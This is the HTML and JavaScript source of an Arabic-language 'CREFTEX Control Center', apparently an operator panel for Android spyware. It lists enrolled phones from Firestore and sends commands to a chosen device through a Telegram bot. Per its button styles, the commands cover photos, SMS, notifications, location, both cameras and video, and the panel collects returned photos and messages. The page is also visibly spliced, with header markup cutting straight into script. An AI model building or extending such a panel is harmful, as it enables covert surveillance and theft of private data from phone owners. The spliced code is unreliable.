<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=1180, initial-scale=1.0, viewport-fit=cover">
<title>CREFTEX — Control Center</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;600;700;800;900&display=swap" rel="stylesheet">
<style>
:root{
    --cyan:#00BFFF;--bright-cyan:#18D8FF;--blue:#168CFF;--deep-blue:#0756C9;
    --purple:#9A45FF;--purple-2:#8B3DFF;--magenta:#D84CFF;
    --green:#00DFA2;--bright-green:#19F59D;
    --yellow:#FFD21C;--orange:#FF9D2E;--red:#FF3B4E;
    --white:#F5F8FF;--light-text:#D7E3F4;--muted:#8998AA;--secondary-text:#8B9AAF;
    --bg:#08111D;--card:#111D2A;--card-2:#162535;--border:#20384C;
}
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow-x:hidden}
body{
    font-family:'Cairo',sans-serif;
    background:
        radial-gradient(900px 500px at 85% -5%,rgba(0,140,255,.10),transparent 60%),
        radial-gradient(700px 500px at 0% 30%,rgba(139,61,255,.07),transparent 60%),
        radial-gradient(800px 600px at 50% 110%,rgba(0,191,255,.06),transparent 60%),
        linear-gradient(180deg,#07111C 0%,#0B1622 50%,#101C29 100%);
    background-color:var(--bg);
    color:var(--white);
    min-height:100vh;
    display:flex;
    justify-content:center;
    padding:20px;
}
.app{
    width:1180px;
    max-width:100%;
    padding:15px 20px 96px;
    position:relative;
}

/* ═══════ Top Bar ═══════ */
.header{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:8px 2px 18px}
.brand-wrap{display:flex;align-items:center;gap:14px}
.brand{text-align:right}
.brand h1{font-size:30px;font-weight:900;letter-spacing:1px;line-height:1.05;background:linear-gradient(90deg,#19C9FF 20%,#8B5CFF 90%);-webkit-background-clip:text;background-clip:text;color:transparent;filter:drop-shadow(0 0 10px rgba(25,201,255,.45));direction:ltr}
.brand span{font-size:10px;font-weight:700;letter-spacing:5px;color:#66758A;direction:ltr;display:block;margin-top:3px}
.logo{width:72px;height:72px;border-radius:50%;object-fit:cover;filter:drop-shadow(0 0 12px rgba(24,216,255,.9));flex-shrink:0}
.admin-btn{display:flex;align-items:center;gap:9px;padding:10px 18px;border-radius:999px;background:#10283A;border:1px solid #17638B;box-shadow:0 0 14px rgba(0,140,255,.18),inset 0 0 12px rgba(24,216,255,.06);color:var(--light-text);font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;font-family:inherit}
.admin-btn svg{width:18px;height:18px}
.admin-btn .crown{width:17px;height:17px}

/* ═══════ Stats ═══════ */
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:18px}
.stat{border-radius:20px;background:#111D2A;padding:18px 10px;display:flex;flex-direction:row-reverse;align-items:center;justify-content:center;gap:12px;position:relative;overflow:hidden}
.stat .num{font-size:34px;font-weight:800;line-height:1;direction:ltr;font-family:'Cairo',sans-serif}
.stat .lbl{font-size:13px;font-weight:600;color:var(--muted);margin-top:3px}
.stat .col{display:flex;flex-direction:column;align-items:center;gap:2px}
.stat img{width:30px;height:30px;object-fit:contain}
.stat.c{border:1.5px solid rgba(0,191,255,.75);box-shadow:0 0 20px rgba(0,191,255,.22),inset 0 0 22px rgba(0,191,255,.05)}
.stat.c .num{color:#18D8FF;text-shadow:0 0 14px rgba(24,216,255,.55)}
.stat.g{border:1.5px solid rgba(0,230,160,.7);box-shadow:0 0 20px rgba(0,223,162,.20),inset 0 0 22px rgba(0,223,162,.05)}
.stat.g .num{color:#19F59D;text-shadow:0 0 14px rgba(25,245,157,.5)}
.stat.p{border:1.5px solid rgba(154,69,255,.75);box-shadow:0 0 20px rgba(154,69,255,.25),inset 0 0 22px rgba(154,69,255,.06)}
.stat.p .num{color:#B46BFF;text-shadow:0 0 14px rgba(180,107,255,.55)}

/* ═══════ Main Nav ═══════ */
.mainnav{background:#101D2A;border:1px solid #1D3548;border-radius:22px;padding:10px;display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:18px;box-shadow:0 10px 30px rgba(0,0,0,.35)}
.navitem{display:flex;align-items:center;justify-content:center;gap:8px;padding:13px 8px;border-radius:16px;color:var(--secondary-text);font-size:14px;font-weight:700;cursor:pointer;position:relative;border:1px solid transparent;font-family:inherit;background:none}
.navitem svg{width:20px;height:20px;color:#93A6BC}
.navitem .dot{position:absolute;top:8px;left:22%;width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 8px rgba(255,59,78,.9)}
.navitem.active{background:linear-gradient(135deg,#0876D9 0%,#0A4EC1 100%);border:1px solid var(--cyan);color:#fff;box-shadow:0 0 20px rgba(0,150,255,.5),inset 0 0 14px rgba(24,216,255,.25)}
.navitem.active svg{color:#fff;filter:drop-shadow(0 0 5px rgba(255,255,255,.6))}

/* ═══════ Sections ═══════ */
.section{background:#111F2C;border:1px solid #203A4D;border-radius:28px;padding:20px 20px;margin-bottom:18px;box-shadow:0 10px 35px rgba(0,0,0,.35)}
.section-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
.section-title{display:flex;align-items:center;gap:10px;font-size:18px;font-weight:800;color:var(--white)}
.section-title svg{width:22px;height:22px;color:#4FC4FF;filter:drop-shadow(0 0 6px rgba(0,191,255,.5))}
.count-badge{min-width:26px;height:26px;padding:0 8px;border-radius:999px;background:#0876D9;color:#fff;font-size:14px;font-weight:800;display:flex;align-items:center;justify-content:center;box-shadow:0 0 12px rgba(8,118,217,.6)}
.refresh-btn{width:40px;height:40px;border-radius:12px;background:#10283A;border:1px solid #17638B;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 0 10px rgba(0,140,255,.15)}
.refresh-btn:active{transform:scale(.95)}

/* ═══════ Device Card ═══════ */
.device-card{border-radius:25px;background:linear-gradient(160deg,#142231 0%,#131E30 60%,#1B1830 100%);border:2px solid transparent;background-clip:padding-box;position:relative;padding:20px 18px;display:flex;align-items:center;gap:16px;box-shadow:0 0 24px rgba(0,175,255,.18),0 0 40px rgba(179,60,255,.10);margin-bottom:12px;cursor:pointer;transition:transform .15s}
.device-card:active{transform:scale(.99)}
.device-card.selected{box-shadow:0 0 0 2px #00BFFF,0 0 30px rgba(0,191,255,.4),0 0 40px rgba(179,60,255,.15)}
.device-card::before{content:"";position:absolute;inset:-2px;border-radius:25px;background:linear-gradient(120deg,#00AFFF 0%,#2E7FE8 40%,#8B3DFF 75%,#B33CFF 100%);z-index:-1}
.device-card.inactive::before{background:linear-gradient(120deg,#5a2020 0%,#8b2d2d 40%,#b33c3c 75%,#d84c4c 100%)}
.status-dot{width:24px;height:24px;border-radius:50%;background:rgba(255,48,72,.12);border:1.5px solid rgba(255,48,72,.55);display:flex;align-items:center;justify-content:center;position:absolute;top:14px;left:14px}
.status-dot::after{content:"";width:10px;height:10px;border-radius:50%;background:var(--red);box-shadow:0 0 10px rgba(255,48,72,.95)}
.status-dot.active{background:rgba(25,245,157,.12);border-color:rgba(25,245,157,.55)}
.status-dot.active::after{background:var(--bright-green);box-shadow:0 0 10px rgba(25,245,157,.95)}
.device-info{flex:1;min-width:0;text-align:left}
.device-info .name-row{display:flex;align-items:center;gap:8px;direction:ltr;margin-bottom:8px}
.device-info h3{font-size:18px;font-weight:800;color:#F2F6FF;letter-spacing:.3px;direction:ltr}
.device-info .edit-name{width:26px;height:26px;border-radius:8px;background:rgba(59,130,246,.15);border:1px solid rgba(59,130,246,.3);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.device-info .edit-name svg{width:13px;height:13px;color:#4FC4FF}
.device-info .row{display:flex;align-items:center;gap:8px;font-size:12.5px;font-weight:600;color:#8395A9;margin-top:5px;direction:ltr}
.device-info .row svg{width:15px;height:15px;color:#5E7A93;flex-shrink:0}
.device-info .row .ar{direction:rtl;unicode-bidi:plaintext}
.device-info input.rename{background:rgba(15,26,42,.6);border:1px solid rgba(59,130,246,.35);color:#F2F6FF;font-family:inherit;font-size:15px;font-weight:700;padding:6px 10px;border-radius:10px;width:100%;outline:none;text-align:center;display:none}
.device-info input.rename.show{display:block}
.chev{width:34px;height:34px;border-radius:50%;border:1px solid rgba(139,154,175,.35);display:flex;align-items:center;justify-content:center;flex-shrink:0}
.chev svg{width:15px;height:15px;color:#93A6BC}

.divider{height:2px;border-radius:2px;background:linear-gradient(90deg,transparent,rgba(0,191,255,.7) 30%,rgba(139,61,255,.7) 70%,transparent);margin:4px 0 18px;box-shadow:0 0 10px rgba(0,191,255,.35)}

/* ═══════ Commands ═══════ */
.cmd-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
.cmd{display:flex;align-items:center;justify-content:center;gap:10px;background:#152432;border-radius:18px;padding:17px 14px;cursor:pointer;font-size:13.5px;font-weight:700;color:var(--light-text);border:1.5px solid;font-family:inherit;transition:transform .12s}
.cmd:active{transform:scale(.97)}
.cmd .lead{display:flex;align-items:center;gap:10px}
.cmd svg{width:24px;height:24px}
.cmd img.ic{width:24px;height:24px;object-fit:contain}
.cmd.photos{border-color:rgba(22,140,255,.65);box-shadow:0 0 14px rgba(22,140,255,.16)}
.cmd.photos .ic{filter:drop-shadow(0 0 6px rgba(139,92,255,.7))}
.cmd.images{border-color:rgba(0,191,255,.65);box-shadow:0 0 14px rgba(0,191,255,.16)}
.cmd.images .ic{filter:drop-shadow(0 0 6px rgba(0,191,255,.7))}
.cmd.sms{border-color:rgba(0,223,162,.65);box-shadow:0 0 14px rgba(0,223,162,.15)}
.cmd.sms .ic{filter:drop-shadow(0 0 6px rgba(0,223,162,.7))}
.cmd.notif{border-color:rgba(255,210,28,.6);box-shadow:0 0 14px rgba(255,210,28,.14)}
.cmd.notif .ic{filter:drop-shadow(0 0 6px rgba(255,210,28,.65))}
.cmd.loc{border-color:rgba(255,157,46,.65);box-shadow:0 0 14px rgba(255,157,46,.15)}
.cmd.loc svg{color:#FF9D2E;filter:drop-shadow(0 0 6px rgba(255,157,46,.7))}
.cmd.allimg{border-color:rgba(154,69,255,.65);box-shadow:0 0 14px rgba(154,69,255,.16)}
.cmd.allimg svg{color:#B46BFF;filter:drop-shadow(0 0 6px rgba(154,69,255,.7))}
.cmd.readauto{border-color:rgba(216,76,255,.6);box-shadow:0 0 14px rgba(216,76,255,.15)}
.cmd.readauto svg{color:#D84CFF;filter:drop-shadow(0 0 6px rgba(216,76,255,.7))}
.cmd.readonce{border-color:rgba(25,245,157,.6);box-shadow:0 0 14px rgba(25,245,157,.14)}
.cmd.readonce svg{color:#19F59D;filter:drop-shadow(0 0 6px rgba(25,245,157,.7))}
.cmd.stop{border-color:rgba(255,59,78,.65);box-shadow:0 0 14px rgba(255,59,78,.16)}
.cmd.stop svg{color:#FF3B4E;filter:drop-shadow(0 0 6px rgba(255,59,78,.7))}
.cmd.camf{border-color:rgba(24,216,255,.65);box-shadow:0 0 14px rgba(24,216,255,.16)}
.cmd.camf svg{color:#18D8FF;filter:drop-shadow(0 0 6px rgba(24,216,255,.7))}
.cmd.camb{border-color:rgba(22,140,255,.65);box-shadow:0 0 14px rgba(22,140,255,.16)}
.cmd.camb svg{color:#4FC4FF;filter:drop-shadow(0 0 6px rgba(22,140,255,.7))}
.cmd.info{border-color:rgba(79,196,255,.65);box-shadow:0 0 14px rgba(79,196,255,.15)}
.cmd.info svg{color:#4FC4FF;filter:drop-shadow(0 0 6px rgba(79,196,255,.7))}
.cmd.video{border-color:rgba(255,157,46,.65);box-shadow:0 0 14px rgba(255,157,46,.15)}
.cmd.video svg{color:#FF9D2E;filter:drop-shadow(0 0 6px rgba(255,157,46,.7))}

/* ═══════ Log Panel ═══════ */
.log-tabs{display:flex;gap:6px;margin-bottom:14px;flex-wrap:wrap}
.log-tab{padding:9px 18px;border-radius:12px;background:#10283A;border:1px solid #1D3548;color:#8B9AAF;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit}
.log-tab.on{background:linear-gradient(135deg,#0876D9,#0A4EC1);border-color:var(--cyan);color:#fff;box-shadow:0 0 14px rgba(0,150,255,.45)}
.log-body{background:#0a1420;border:1px solid #1D3548;border-radius:16px;padding:18px;min-height:500px;max-height:720px;overflow-y:auto}
.log-body::-webkit-scrollbar{width:8px}
.log-body::-webkit-scrollbar-track{background:transparent}
.log-body::-webkit-scrollbar-thumb{background:#20384C;border-radius:4px}
.log-entry{display:flex;gap:14px;padding:14px 16px;margin-bottom:12px;background:rgba(20,32,48,.7);border:1px solid #1D3548;border-radius:14px;position:relative;animation:fadeUp .3s ease}
@keyframes fadeUp{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
.log-entry::before{content:'';position:absolute;right:0;top:0;bottom:0;width:3px;border-radius:0 14px 14px 0;background:var(--blue)}
.log-entry.from-bot::before{background:var(--cyan)}
.log-entry.from-user::before{background:var(--green)}
.log-entry.is-photo::before{background:var(--purple)}
.log-entry .avatar{width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,var(--blue),var(--cyan));display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0}
.log-entry.from-bot .avatar{background:linear-gradient(135deg,var(--cyan),#0ea5e9)}
.log-entry.from-user .avatar{background:linear-gradient(135deg,var(--green),#059669)}
.log-entry.is-photo .avatar{background:linear-gradient(135deg,var(--purple),var(--blue))}
.log-entry .content{flex:1;min-width:0}
.log-entry .meta{display:flex;align-items:center;gap:12px;margin-bottom:8px}
.log-entry .who{font-size:13px;font-weight:800;color:var(--light-text)}
.log-entry .when{font-size:11px;color:var(--muted);direction:ltr;font-weight:600}
.log-entry .body{font-size:14px;color:var(--white);line-height:1.75;white-space:pre-wrap;word-break:break-word;direction:rtl}
.log-entry .body img{max-width:100%;max-height:520px;border-radius:12px;margin-top:10px;border:1px solid #1D3548;display:block;cursor:pointer}
.log-entry .body audio,.log-entry .body video{width:100%;margin-top:10px;border-radius:12px}

.log-empty{text-align:center;padding:120px 20px;color:var(--muted)}
.log-empty .ico{font-size:64px;margin-bottom:16px;opacity:.35}
.log-empty p{font-size:15px;font-weight:700}

/* ═══════ Bottom Nav ═══════ */
.bottomnav{position:fixed;bottom:0;left:0;right:0;background:rgba(8,20,33,.92);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border-top:1px solid var(--border);display:grid;grid-template-columns:repeat(4,1fr);padding:10px 6px calc(12px + env(safe-area-inset-bottom));z-index:50;box-shadow:0 -8px 30px rgba(0,0,0,.5);max-width:1180px;margin:0 auto}
.bitem{display:flex;flex-direction:column;align-items:center;gap:5px;font-size:12px;font-weight:700;color:#8A9AAD;cursor:pointer;padding:5px 0 3px;position:relative;background:none;border:none;font-family:inherit}
.bitem svg{width:24px;height:24px}
.bitem.active{color:#00C8FF}
.bitem.active svg{color:#00C8FF;filter:drop-shadow(0 0 8px rgba(0,200,255,.8))}
.bitem.active::after{content:"";position:absolute;bottom:-3px;width:36px;height:3px;border-radius:3px;background:#00C8FF;box-shadow:0 0 12px rgba(0,200,255,.9)}

/* ═══════ Page overlay ═══════ */
.page{position:fixed;top:0;left:0;right:0;bottom:0;z-index:60;background:
    radial-gradient(900px 500px at 85% -5%,rgba(0,140,255,.10),transparent 60%),
    radial-gradient(700px 500px at 0% 30%,rgba(139,61,255,.07),transparent 60%),
    linear-gradient(180deg,#07111C 0%,#0B1622 50%,#101C29 100%);
    transform:translateY(103%);transition:transform .38s cubic-bezier(.2,.8,.2,1);display:flex;flex-direction:column;padding:20px 24px;max-width:1180px;margin:0 auto}
.page.open{transform:translateY(0)}
.page-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
.page-title{display:flex;align-items:center;gap:10px;font-size:22px;font-weight:800;color:#F2F6FF}
.back-btn{width:44px;height:44px;border-radius:13px;background:#10283A;border:1px solid #17638B;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 0 10px rgba(0,140,255,.15);flex-shrink:0}
.back-btn svg{width:20px;height:20px;color:#35B6FF}
.nodata{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;color:#5E7A93;font-size:24px;font-weight:800;letter-spacing:1px}
.nodata svg{width:70px;height:70px;color:#33506B;filter:drop-shadow(0 0 10px rgba(0,140,255,.15))}
.pstatus{display:flex;align-items:center;justify-content:center;gap:10px;background:#10283A;border:1px solid #17638B;border-radius:14px;padding:12px 14px;font-size:14px;font-weight:700;color:#9FDBFF;margin-bottom:14px;box-shadow:0 0 12px rgba(0,140,255,.15)}
.pstatus.ok{border-color:rgba(25,245,157,.55);color:#19F59D;box-shadow:0 0 14px rgba(25,245,157,.25)}
.spin{width:18px;height:18px;border:2px solid rgba(53,182,255,.25);border-top-color:#35B6FF;border-radius:50%;animation:sp .8s linear infinite;flex-shrink:0}
@keyframes sp{to{transform:rotate(360deg)}}
.pagestop{margin-top:14px;width:100%;padding:16px;border-radius:16px;background:linear-gradient(135deg,#B3122A,#FF3B4E);border:1px solid rgba(255,59,78,.8);color:#fff;font-family:inherit;font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 0 18px rgba(255,59,78,.35)}
.page-content{flex:1;overflow-y:auto;background:#0a1420;border:1px solid #1D3548;border-radius:16px;padding:18px;display:none}
.page-content.show{display:block}
.exec-top{display:flex;align-items:center;gap:10px;margin-bottom:14px}
.etabs{display:flex;gap:8px;overflow-x:auto;flex:1;padding:4px 2px;scrollbar-width:none}
.etabs::-webkit-scrollbar{display:none}
.etab{white-space:nowrap;padding:9px 14px;border-radius:12px;background:#10283A;border:1px solid #1D3548;color:#8B9AAF;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit}
.etab.on{background:linear-gradient(135deg,#0876D9,#0A4EC1);border-color:var(--cyan);color:#fff;box-shadow:0 0 14px rgba(0,150,255,.45)}
.execback{margin-top:14px;width:100%;padding:16px;border-radius:16px;background:#10283A;border:1px solid #17638B;color:#35B6FF;font-family:inherit;font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 0 12px rgba(0,140,255,.15)}

/* ═══════ Toast ═══════ */
.toast{position:fixed;bottom:100px;left:50%;transform:translateX(-50%) translateY(100px);padding:14px 24px;border-radius:14px;font-size:14px;font-weight:800;background:rgba(17,29,42,.95);border:1px solid #20384C;backdrop-filter:blur(20px);transition:transform .3s ease;z-index:9999;box-shadow:0 12px 40px rgba(0,0,0,.5);max-width:90%;color:var(--white)}
.toast.show{transform:translateX(-50%) translateY(0)}
.toast.ok{border-color:rgba(25,245,157,.5);color:#19F59D}
.toast.err{border-color:rgba(255,59,78,.5);color:#FF3B4E}
.toast.wait{border-color:rgba(53,182,255,.5);color:#35B6FF}

/* ═══════ Modal ═══════ */
.modal{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:99999;display:none;align-items:center;justify-content:center;padding:40px}
.modal.show{display:flex}
.modal img{max-width:100%;max-height:90vh;border-radius:16px;box-shadow:0 20px 80px rgba(0,0,0,.8)}
.modal-close{position:absolute;top:24px;right:24px;width:48px;height:48px;border-radius:50%;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);color:#fff;font-size:24px;cursor:pointer;font-family:inherit}

/* RTL helpers */
[dir="ltr"]{direction:ltr}
</style>
</head>
<body>
<div class="app">
    <!-- ═══════ Header ═══════ -->
    <header class="header">
        <div class="brand-wrap">
            <img class="logo" src="https://i.ibb.co/Y4Yts8WK/file-00000000176c8243bee7f4f1a464120b.png" alt="CREFTEX">
            <div class="brand">
                <h1>CREFTEX</h1>
                <span>CONTROL CENTER</span>
            </div>

function toast(msg, type='wait'){
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.className = 'toast show ' + type;
    clearTimeout(window.__toastTm);
    window.__toastTm = setTimeout(()=>t.classList.remove('show'), 3000);
}

// ═══════════════════════════════════════
//  Navigation
// ═══════════════════════════════════════
function navTo(el, target){
    document.querySelectorAll('.navitem, .bitem').forEach(n=>n.classList.remove('active'));
    if (el && el.classList) el.classList.add('active');
    if (target === 'home'){
        window.scrollTo({top:0, behavior:'smooth'});
        return;
    }
    if (target === 'log'){
        document.getElementById('logBody').scrollIntoView({behavior:'smooth', block:'center'});
        return;
    }
    if (target === 'photos'){
        loadMessages(false);
        document.getElementById('logBody').scrollIntoView({behavior:'smooth', block:'center'});
        filterLogByName('photo');
        return;
    }
    if (target === 'messages'){
        loadMessages(false);
        document.getElementById('logBody').scrollIntoView({behavior:'smooth', block:'center'});
        filterLogByName('user');
        return;
    }
    if (target === 'notifs'){
        loadMessages(false);
        document.getElementById('logBody').scrollIntoView({behavior:'smooth', block:'center'});
        filterLogByName('bot');
        return;
    }
    if (target === 'settings'){
        alert('الإعدادات قيد التطوير');
        return;
    }
}

function filterLogByName(mode){
    document.querySelectorAll('.log-tab').forEach(t=>t.classList.remove('on'));
    document.querySelectorAll('.log-tab').forEach(t=>{
        if (t.textContent.includes('الكل') && mode === 'all') t.classList.add('on');
        if (t.textContent.includes('أنا') && mode === 'user') t.classList.add('on');
        if (t.textContent.includes('البوت') && mode === 'bot') t.classList.add('on');
        if (t.textContent.includes('صور') && mode === 'photo') t.classList.add('on');
    });
    currentFilter = mode;
    renderLog();
}

// ═══════════════════════════════════════
//  Devices
// ═══════════════════════════════════════
async function loadDevices(){
    try{
        const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`);
        const data = await res.json();
        const docs = data.documents || [];

        const list = document.getElementById('devicesList');

        if (docs.length === 0){
            list.innerHTML = '<div class="log-empty"><div class="ico">📱</div><p>لا أجهزة مسجّلة بعد</p></div>';
            document.getElementById('statDevices').textContent = '0';
            document.getElementById('statActive').textContent = '0';
            document.getElementById('devCount').textContent = '0';
            return;
        }

        const devices = docs.map(d=>{
            const f = d.fields || {};
            const lastSeen = parseInt(f.last_seen_ms?.integerValue || '0');
            return {
                id: f.id?.stringValue || '',
                brand: f.brand?.stringValue || '',
                manufacturer: f.manufacturer?.stringValue || '',
                model: f.model?.stringValue || '',
                android: f.android?.stringValue || '',
                lastSeen: lastSeen,
                isActive: (Date.now() - lastSeen) < 10 * 60 * 1000
            };
        }).sort((a,b)=>b.lastSeen - a.lastSeen);

        document.getElementById('statDevices').textContent = devices.length;
        document.getElementById('statActive').textContent = devices.filter(d=>d.isActive).length;
        document.getElementById('devCount').textContent = devices.length;

        list.innerHTML = '';
        for (const d of devices) list.appendChild(buildDeviceCard(d));
    } catch(e){
        console.error(e);
        document.getElementById('devicesList').innerHTML = '<div class="log-empty"><div class="ico">⚠️</div><p>تعذّر تحميل الأجهزة</p></div>';
    }
}

function buildDeviceCard(d){
    const card = document.createElement('div');
    card.className = 'device-card' + (d.isActive ? '' : ' inactive');
    if (selectedDevice && selectedDevice.id === d.id) card.classList.add('selected');
    card.onclick = (e)=>{
        if (e.target.closest('.edit-name') || e.target.tagName === 'INPUT') return;
        selectDevice(d);
    };

    const customName = deviceNames[d.id] || '';
    const displayName = customName || `${d.manufacturer} ${d.model}`;
    const lastSeenStr = d.lastSeen > 0
        ? new Date(d.lastSeen).toLocaleString('ar-EG', {hour:'2-digit', minute:'2-digit', day:'2-digit', month:'2-digit'})
        : '—';

    card.innerHTML = `
        <span class="status-dot ${d.isActive ? 'active' : ''}"></span>
        <div class="device-info">
            <div class="name-row">
                <h3 class="dev-name-text">${escapeHtml(displayName)}</h3>
                <button class="edit-name" onclick="event.stopPropagation();enableRename(this,'${escapeAttr(d.id)}')">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4 12.5-12.5z"/></svg>
                </button>
            </div>
            <input class="rename" data-device-id="${escapeAttr(d.id)}" placeholder="${escapeAttr(d.manufacturer + ' ' + d.model)}" onchange="saveRename(this)" onblur="saveRename(this)">
            <div class="row">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="7" width="12" height="11" rx="2.5"/><path d="M9 7V4.5M15 7V4.5"/><path d="M3.5 11v4M20.5 11v4"/></svg>
                Android: ${escapeHtml(d.android)}
            </div>
            <div class="row">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="8.5"/><path d="M12 7.5V12l3 2"/></svg>
                <span class="ar">آخر ظهور: ${lastSeenStr}</span>
            </div>
            <div class="row">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="3"/><path d="M9 2v2M15 2v2M9 20v2M15 20v2M2 9h2M2 15h2M20 9h2M20 15h2"/></svg>
                ID: ${escapeHtml(d.id)}
            </div>
        </div>
        <div class="chev">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5.5 15.5 12 9 18.5"/></svg>
        </div>
    `;
    return card;
}

function enableRename(btn, deviceId){
    const card = btn.closest('.device-card');
    const input = card.querySelector('input.rename');
    const h3 = card.querySelector('.dev-name-text');
    input.value = deviceNames[deviceId] || h3.textContent;
    input.classList.add('show');
    h3.style.display = 'none';
    input.focus();
    input.select();
}

function saveRename(input){
    const deviceId = input.getAttribute('data-device-id');
    const newName = input.value.trim();
    const card = input.closest('.device-card');
    const h3 = card.querySelector('.dev-name-text');

    if (newName){
        deviceNames[deviceId] = newName;
        h3.textContent = newName;
    } else {
        delete deviceNames[deviceId];
        // استعادة الاسم الأصلي
        h3.textContent = input.placeholder;
    }
    localStorage.setItem('device_names', JSON.stringify(deviceNames));
    input.classList.remove('show');
    h3.style.display = 'block';
    if (newName) toast('✅ تم حفظ الاسم', 'ok');
}

function selectDevice(d){
    selectedDevice = d;
    const customName = deviceNames[d.id] || '';
    const displayName = customName || `${d.manufacturer} ${d.model}`;

    document.getElementById('cmdDeviceName').textContent = displayName;
    document.getElementById('commandsSection').style.display = 'block';

    document.querySelectorAll('.device-card').forEach(c=>c.classList.remove('selected'));
    document.querySelectorAll('.device-card').forEach(c=>{
        if (c.querySelector(`input[data-device-id="${d.id}"]`)) c.classList.add('selected');
    });

    document.getElementById('commandsSection').scrollIntoView({behavior:'smooth', block:'start'});
    toast(`✅ تم تحديد: ${displayName}`, 'ok');
}

// ═══════════════════════════════════════
//  Commands
// ═══════════════════════════════════════
async function sendCmd(cmd, label){
    if (!selectedDevice){ toast('اختر جهازًا أولًا', 'err'); return; }
    toast(`⏳ ${label || cmd}`, 'wait');
    try{
        const fullCmd = `${cmd} #${selectedDevice.id}`;
        const res = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: fullCmd})
        });
        const data = await res.json();
        if (data.ok){
            toast(`✅ ${label || cmd}`, 'ok');
            setTimeout(()=>{pullIncoming(); loadMessages(false);}, 2500);
        } else {
            toast(`❌ ${data.description}`, 'err');
        }
    } catch(e){ toast(`❌ ${e.message}`, 'err'); }
}

// ═══════════════════════════════════════
//  Messages
// ═══════════════════════════════════════
async function pullIncoming(){
    try{
        const offset = lastUpdateId === 0 ? 0 : lastUpdateId + 1;
        const res = await fetch(`${TG_API}/getUpdates?offset=${offset}&limit=100`);
        const data = await res.json();
        if (!data.ok) return;

        for (const u of (data.result || [])){
            lastUpdateId = Math.max(lastUpdateId, u.update_id);
            const msg = u.message;
            if (!msg) continue;
            const key = `in_${msg.message_id}`;
            if (messageCache[key]) continue;
            messageCache[key] = true;

            if (msg.text){
                await saveToFS({chat_id: msg.chat.id, type:'text', text: msg.text, time_ms: msg.date * 1000, from_user: true});
            } else if (msg.photo && msg.photo.length > 0){
                const fileId = msg.photo[msg.photo.length - 1].file_id;
                await saveToFS({chat_id: msg.chat.id, type:'photo', file_id: fileId, caption: msg.caption || '', time_ms: msg.date * 1000, from_user: true});
            }
        }
    } catch(e){}
}

async function saveToFS(obj){
    try{
        const fields = {};
        for (const [k, v] of Object.entries(obj)){
            if (typeof v === 'number') fields[k] = {integerValue: String(v)};
            else if (typeof v === 'boolean') fields[k] = {booleanValue: v};
            else fields[k] = {stringValue: String(v)};
        }
        await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({fields})
        });
    } catch(e){}
}

async function loadMessages(showToastFlag){
    if (showToastFlag) toast('⏳ جلب الرسائل...', 'wait');
    try{
        const res = await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=500`);
        const data = await res.json();

        allMessages = (data.documents || []).map(d=>{
            const f = d.fields || {};
            return {
                type: f.type?.stringValue || 'text',
                text: f.text?.stringValue || '',
                file_id: f.file_id?.stringValue || '',
                caption: f.caption?.stringValue || '',
                time_ms: parseInt(f.time_ms?.integerValue || '0'),
                from_user: f.from_user?.booleanValue || false
            };
        }).sort((a,b)=>a.time_ms - b.time_ms);

        document.getElementById('statMsgs').textContent = allMessages.length;
        renderLog();
        renderExec();

        if (showToastFlag) toast(`✅ ${allMessages.length} رسالة`, 'ok');
    } catch(e){
        if (showToastFlag) toast(`❌ ${e.message}`, 'err');
    }
}

function renderLog(){
    const body = document.getElementById('logBody');

    let filtered = allMessages;
    if (currentFilter === 'user') filtered = allMessages.filter(m=>m.from_user);
    else if (currentFilter === 'bot') filtered = allMessages.filter(m=>!m.from_user);
    else if (currentFilter === 'photo') filtered = allMessages.filter(m=>m.type === 'photo');

    if (filtered.length === 0){
